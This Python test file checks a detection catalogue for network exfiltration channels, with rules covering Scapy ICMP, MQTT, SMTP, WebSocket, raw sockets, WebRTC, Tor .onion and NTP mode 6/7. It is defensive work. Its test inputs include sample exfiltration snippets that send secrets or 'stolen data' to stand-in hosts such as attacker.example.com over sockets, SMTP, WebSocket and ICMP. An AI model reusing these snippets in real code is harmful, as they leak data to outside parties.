"""Tests for scripts/lib/network_exfil_patterns.py.

Pattern-coverage tests for the Wave-17 (distill round 3, agent B)
network-exfil-channel catalogue (Scapy ICMP, MQTT broker, SMTP relay,
WebSocket egress, raw AF_INET socket, WebRTC data channels, Tor .onion,
NTP mode-6/7). Every rule gets at least one positive + one negative test.
"""

from __future__ import annotations

import sys
from pathlib import Path

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_PROJECT_ROOT / "scripts" / "lib"))

import network_exfil_patterns as nep  # type: ignore[import-not-found]  # noqa: E402

# ---------- Data-model sanity --------------------------------------------


def test_rules_tuple_is_frozen_ordered() -> None:
    """RULES must be a tuple (immutable) and contain every advertised rule id."""
    assert isinstance(nep.RULES, tuple)
    rule_ids = [r.id for r in nep.RULES]
    expected = {
        "python-icmp-scapy-exfil",
        "python-mqtt-attacker-broker",
        "python-smtp-non-allowlisted-relay",
        "js-py-websocket-non-allowlisted-egress",
        "python-raw-socket-afinet-exfil",
        "js-webrtc-data-channel-egress",
        "dot-onion-reference-any-tracked-file",
        "python-ntplib-mode7-control-query",
    }
    assert expected.issubset(set(rule_ids))


def test_every_rule_has_owasp_mapping() -> None:
    """Every catalog rule must declare a real ASI mapping and a valid severity."""
    for rule in nep.RULES:
        assert rule.owasp_asi.startswith("ASI-"), rule.id
        assert rule.severity in {"CRITICAL", "HIGH", "MEDIUM", "LOW"}, rule.id


def test_finding_named_tuple_shape() -> None:
    """Finding is a frozen NamedTuple — must accept the documented fields."""
    f = nep.Finding(
        rule_id="r", line=1, column=2, matched_text="m",
        severity="HIGH", description="d", owasp_asi="ASI-02",
    )
    assert f.rule_id == "r"
    assert f.line == 1
    assert f.column == 2
    assert f.matched_text == "m"
    assert f.severity == "HIGH"
    assert f.description == "d"
    assert f.owasp_asi == "ASI-02"


def test_loopback_allowlist_exported() -> None:
    """Detectors import LOOPBACK_HOSTS to stay lockstep with the catalog."""
    assert "127.0.0.1" in nep.LOOPBACK_HOSTS
    assert "localhost" in nep.LOOPBACK_HOSTS
    assert "::1" in nep.LOOPBACK_HOSTS


def test_smtp_allowlist_exported() -> None:
    """Detectors import SMTP_RELAY_ALLOWLIST so their stage-2 stays consistent."""
    assert "smtp.gmail.com" in nep.SMTP_RELAY_ALLOWLIST
    assert "smtp.sendgrid.net" in nep.SMTP_RELAY_ALLOWLIST


# ---------- helpers ------------------------------------------------------


def _hits(rule_id: str, text: str) -> list[nep.Finding]:
    """Return only findings of `rule_id` from scan_text(text)."""
    return [f for f in nep.scan_text(text) if f.rule_id == rule_id]


def test_empty_text_no_findings() -> None:
    """Empty input must return an empty list — scan_text fast-path."""
    assert nep.scan_text("") == []
    assert nep.scan_text("   \n   \n") == []


# ---------- 1. Scapy ICMP exfil ------------------------------------------


def test_scapy_icmp_exfil_positive_inline() -> None:
    """Classic Scapy IP+ICMP+Raw recipe — import + ICMP() + IP(dst=) co-occur."""
    src = (
        "from scapy.all import IP, ICMP, Raw, send\n"
        "def leak(secret):\n"
        "    pkt = IP(dst='198.51.100.42') / ICMP() / Raw(load=secret)\n"
        "    send(pkt)\n"
    )
    assert _hits("python-icmp-scapy-exfil", src)


def test_scapy_icmp_exfil_positive_separated() -> None:
    """ICMP() and IP(dst=) may live many lines apart inside the 4000-char window."""
    src = (
        "import scapy\n"
        "# big preamble\n"
        + ("# filler\n" * 30)
        + "p1 = ICMP()\n"
        + ("# more filler\n" * 20)
        + "p2 = IP(dst='1.2.3.4')\n"
    )
    assert _hits("python-icmp-scapy-exfil", src)


def test_scapy_icmp_exfil_negative_no_scapy_import() -> None:
    """Mentioning ICMP() and IP(dst=) without a scapy import must NOT fire —
    those words also exist in raw-protocol documentation."""
    src = (
        "# This README discusses how ICMP() and IP(dst=...) work in theory.\n"
        "# No scapy import here, so it's not weaponised.\n"
    )
    assert _hits("python-icmp-scapy-exfil", src) == []


def test_scapy_icmp_exfil_negative_import_only() -> None:
    """A bare `import scapy` without ICMP() call sites must NOT fire."""
    src = (
        "from scapy.all import sniff\n"
        "sniff(prn=lambda p: print(p))\n"
    )
    assert _hits("python-icmp-scapy-exfil", src) == []


# ---------- 2. MQTT broker connect ----------------------------------------


def test_mqtt_broker_connect_positive_external_host() -> None:
    """paho.mqtt.client.connect('host', ...) on an external host fires."""
    src = (
        "import paho.mqtt.client as mqtt\n"
        "client = mqtt.Client()\n"
        "client.connect('attacker.example.com', 1883, 60)\n"
    )
    assert _hits("python-mqtt-attacker-broker", src)


def test_mqtt_broker_connect_positive_from_import() -> None:
    """The `from paho.mqtt import client` shape also fires."""
    src = (
        "from paho.mqtt import client\n"
        "c = client.Client()\n"
        "c.connect('broker.bad.example', 1883)\n"
    )
    assert _hits("python-mqtt-attacker-broker", src)


def test_mqtt_broker_connect_negative_no_paho_import() -> None:
    """A `.connect('host')` without a paho.mqtt import must NOT match —
    .connect() is a generic method on many libraries (DB drivers, etc.)."""
    src = (
        "import sqlite3\n"
        "conn = sqlite3.connect('database.db')\n"
    )
    assert _hits("python-mqtt-attacker-broker", src) == []


def test_mqtt_broker_connect_negative_import_no_connect() -> None:
    """paho.mqtt imported but no .connect() call — no hit."""
    src = (
        "import paho.mqtt.client\n"
        "# placeholder, no connect yet\n"
    )
    assert _hits("python-mqtt-attacker-broker", src) == []


# ---------- 3. SMTP relay connect -----------------------------------------


def test_smtp_relay_smtp_ssl_positive() -> None:
    """smtplib.SMTP_SSL('attacker.com', 465) — classic mail-bot exfil."""
    src = (
        "import smtplib\n"
        "with smtplib.SMTP_SSL('attacker.example.com', 465) as s:\n"
        "    s.sendmail('me', ['attacker@example.com'], 'stolen data')\n"
    )
    assert _hits("python-smtp-non-allowlisted-relay", src)


def test_smtp_relay_lmtp_positive() -> None:
    """smtplib.LMTP also matches the rule's pattern."""
    src = "import smtplib\nl = smtplib.LMTP('lmtp.attacker.example.com', 24)\n"
    assert _hits("python-smtp-non-allowlisted-relay", src)


def test_smtp_relay_negative_no_smtplib_call() -> None:
    """Mentioning smtplib in prose without a relay-connect call must NOT fire."""
    src = (
        "# This module USED to use smtplib, but we've moved to a hosted relay.\n"
        "import logging\n"
    )
    assert _hits("python-smtp-non-allowlisted-relay", src) == []


# ---------- 4. WebSocket egress URL ---------------------------------------


def test_ws_egress_wss_positive() -> None:
    """A wss:// URL anywhere in source matches — JS or Python doesn't matter."""
    src = "const ws = new WebSocket('wss://attacker.example.com/exfil');\n"
    assert _hits("js-py-websocket-non-allowlisted-egress", src)


def test_ws_egress_ws_positive() -> None:
    """The unencrypted `ws://` scheme also matches."""
    src = "import websockets\nasync with websockets.connect('ws://attacker.example.com/c2') as ws:\n    pass\n"
    assert _hits("js-py-websocket-non-allowlisted-egress", src)


def test_ws_egress_uppercase_scheme() -> None:
    """`WSS://` (uppercase) must also match — IGNORECASE on the scheme."""
    src = "const url = 'WSS://attacker.example.com/path';\n"
    assert _hits("js-py-websocket-non-allowlisted-egress", src)


def test_ws_egress_negative_no_ws_url() -> None:
    """Pure HTTP URLs must NOT fire — `wss?://` is the only trigger."""
    src = "fetch('https://example.com/api');\n"
    assert _hits("js-py-websocket-non-allowlisted-egress", src) == []


def test_ws_egress_negative_localhost() -> None:
    """Localhost wss URL: rule still fires textually — the allowlist enforcement
    is the detector's job, not this catalog's. We DO want a positive here so
    the detector can downgrade severity based on the host literal."""
    src = "new WebSocket('wss://localhost:8080/dev')\n"
    # Positive at the catalog layer — detector decides downgrade.
    assert _hits("js-py-websocket-non-allowlisted-egress", src)


# ---------- 5. Raw AF_INET socket exfil cluster --------------------------


def test_raw_socket_afinet_exfil_positive() -> None:
    """Full cluster: import + AF_INET socket + connect tuple + send call."""
    src = (
        "import socket\n"
        "def exfil(data):\n"
        "    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
        "    s.connect(('attacker.example.com', 4444))\n"
        "    s.sendall(data)\n"
        "    s.close()\n"
    )
    assert _hits("python-raw-socket-afinet-exfil", src)


def test_raw_socket_afinet_exfil_send_variant() -> None:
    """`.send(...)` (no `all`) is equally a hit per the pattern."""
    src = (
        "from socket import socket, AF_INET, SOCK_STREAM\n"
        "s = socket.socket(AF_INET, SOCK_STREAM)\n"
        "s.connect(('1.2.3.4', 9999))\n"
        "s.send(b'leak')\n"
    )
    assert _hits("python-raw-socket-afinet-exfil", src)


def test_raw_socket_afinet_exfil_negative_no_send() -> None:
    """Import + AF_INET + connect but NO send/sendall = no hit (no exfil step)."""
    src = (
        "import socket\n"
        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
        "s.connect(('example.com', 80))\n"
        "data = s.recv(1024)\n"
        "s.close()\n"
    )
    # Receive-only is NOT exfil — but our textual pattern needs send/sendall.
    assert _hits("python-raw-socket-afinet-exfil", src) == []


def test_raw_socket_afinet_exfil_negative_af_unix() -> None:
    """AF_UNIX sockets don't match — only AF_INET fires."""
    src = (
        "import socket\n"
        "s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n"
        "s.connect('/tmp/sock')\n"
        "s.send(b'hi')\n"
    )
    assert _hits("python-raw-socket-afinet-exfil", src) == []


# ---------- 6. WebRTC data channel ----------------------------------------


def test_webrtc_data_channel_positive() -> None:
    """Both RTCPeerConnection and createDataChannel within the same file fire."""
    src = (
        "const pc = new RTCPeerConnection({ iceServers: [] });\n"
        "const dc = pc.createDataChannel('exfil', { ordered: true });\n"
        "dc.send(stolen);\n"
    )
    assert _hits("js-webrtc-data-channel-egress", src)


def test_webrtc_data_channel_positive_separated() -> None:
    """The two patterns can be many lines apart inside the same module."""
    src = (
        "const pc = new RTCPeerConnection();\n"
        + ("// filler\n" * 60)
        + "const ch = pc.createDataChannel('binary');\n"
    )
    assert _hits("js-webrtc-data-channel-egress", src)


def test_webrtc_data_channel_negative_peer_only() -> None:
    """RTCPeerConnection alone (video/audio only) must NOT fire."""
    src = (
        "const pc = new RTCPeerConnection();\n"
        "pc.addTrack(stream.getVideoTracks()[0]);\n"
    )
    assert _hits("js-webrtc-data-channel-egress", src) == []


def test_webrtc_data_channel_negative_no_peer_connection() -> None:
    """createDataChannel mentioned in a comment without the peer constructor — no hit."""
    src = "// TODO: explore .createDataChannel() once we add WebRTC support\n"
    assert _hits("js-webrtc-data-channel-egress", src) == []


# ---------- 7. Tor .onion hostname ---------------------------------------


def test_tor_onion_v3_positive() -> None:
    """A 56-char v3 onion (lowercase base32) followed by .onion fires."""
    v3 = "facebookwkhpilnemxj7asaniu7vnjjbiltxjqhye3mhbshg7kx5tfyd"  # 56 chars, public example
    assert len(v3) == 56
    src = f"hidden_service = '{v3}.onion'\n"
    assert _hits("dot-onion-reference-any-tracked-file", src)


def test_tor_onion_v2_positive() -> None:
    """A 16-char v2 onion fires too (legacy but still seen)."""
    v2 = "3g2upl4pq6kufc4m"  # 16 chars, public example (DuckDuckGo legacy)
    assert len(v2) == 16
    src = f"# legacy address: {v2}.onion\n"
    assert _hits("dot-onion-reference-any-tracked-file", src)


def test_tor_onion_negative_short_subdomain() -> None:
    """A 10-char subdomain ending in .onion does NOT match (anchored on 16/56)."""
    src = "short.onion is not a valid Tor address\n"
    assert _hits("dot-onion-reference-any-tracked-file", src) == []


def test_tor_onion_negative_wrong_alphabet() -> None:
    """A 56-char string with chars OUTSIDE [a-z2-7] does not match base32 anchor."""
    # 'z' is valid base32 here, but '9' is not in [a-z2-7]
    bad = "z9z9z9z9z9z9z9z9z9z9z9z9z9z9z9z9z9z9z9z9z9z9z9z9z9z9z9z9"
    assert len(bad) == 56
    src = f"not_an_onion = '{bad}.onion'\n"
    assert _hits("dot-onion-reference-any-tracked-file", src) == []


# ---------- 8. NTP mode-6/7 control query --------------------------------


def test_ntp_mode7_request_positive() -> None:
    """ntplib.NTPClient.request(..., mode=7) — private/admin call fires."""
    src = (
        "import ntplib\n"
        "c = ntplib.NTPClient()\n"
        "resp = c.request('pool.ntp.org', mode=7)\n"
    )
    assert _hits("python-ntplib-mode7-control-query", src)


def test_ntp_mode6_request_positive() -> None:
    """mode=6 (control) also matches."""
    src = "c.request('ntp.example.com', mode=6, version=4)\n"
    assert _hits("python-ntplib-mode7-control-query", src)


def test_ntp_struct_pack_mode7_byte_positive() -> None:
    """Raw struct.pack with first byte 0x17 (mode 7) matches the low-level path."""
    src = (
        "import struct\n"
        "pkt = struct.pack('!B47s', 0x17, b'\\x00' * 47)\n"
    )
    assert _hits("python-ntplib-mode7-control-query", src)


def test_ntp_mode_negative_mode4_client() -> None:
    """mode=4 (server response — normal SNTP) must NOT match."""
    src = "c.request('pool.ntp.org', mode=4)\n"
    assert _hits("python-ntplib-mode7-control-query", src) == []


def test_ntp_mode_negative_struct_pack_other_byte() -> None:
    """struct.pack with first byte 0x20 (mode 4) must NOT match."""
    src = "pkt = struct.pack('!B47s', 0x20, b'\\x00' * 47)\n"
    assert _hits("python-ntplib-mode7-control-query", src) == []


# ---------- scan_text integration ----------------------------------------


def test_scan_text_returns_sorted_by_line_col() -> None:
    """scan_text findings come back sorted by (line, column, rule_id)."""
    src = (
        "import ntplib\n"                                           # line 1
        "c = ntplib.NTPClient()\n"                                  # line 2
        "x = new WebSocket('wss://attacker.example.com/path');\n"   # line 3
        "y = c.request('a', mode=6)\n"                              # line 4
    )
    findings = nep.scan_text(src)
    lines = [f.line for f in findings]
    assert lines == sorted(lines)


def test_scan_text_file_kind_parity() -> None:
    """`file_kind='source'` and `file_kind='prose'` return the same findings —
    network-exfil patterns target source-shape regardless of file kind."""
    src = (
        "import socket\n"
        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
        "s.connect(('attacker.example.com', 4444))\n"
        "s.send(b'leak')\n"
    )
    prose = nep.scan_text(src, file_kind="prose")
    source = nep.scan_text(src, file_kind="source")
    # Same set of (rule_id, line, column) keys.
    assert {(f.rule_id, f.line, f.column) for f in prose} == {
        (f.rule_id, f.line, f.column) for f in source
    }


def test_scan_text_dedupes_same_rule_same_position() -> None:
    """One match position emits exactly one finding per rule, no duplicates."""
    src = "exfil_url = 'wss://attacker.example.com/path'\n"
    findings = [f for f in nep.scan_text(src) if f.rule_id == "js-py-websocket-non-allowlisted-egress"]
    # Exactly one finding for the single match.
    assert len(findings) == 1


def test_scan_text_long_match_truncated() -> None:
    """Matched text > 200 chars is truncated with an ellipsis marker."""
    # Build a Scapy file where the bridge between import + ICMP + IP(dst=) is
    # very long — the matched_text will exceed 200 chars.
    src = (
        "from scapy.all import IP, ICMP, Raw, send\n"
        + ("# very long padding comment line ##############\n" * 20)
        + "x = ICMP()\n"
        + ("# trailing padding\n" * 10)
        + "y = IP(dst='1.2.3.4')\n"
    )
    findings = [f for f in nep.scan_text(src) if f.rule_id == "python-icmp-scapy-exfil"]
    assert findings
    # At least one finding had its matched_text truncated.
    assert any(f.matched_text.endswith("…") for f in findings)
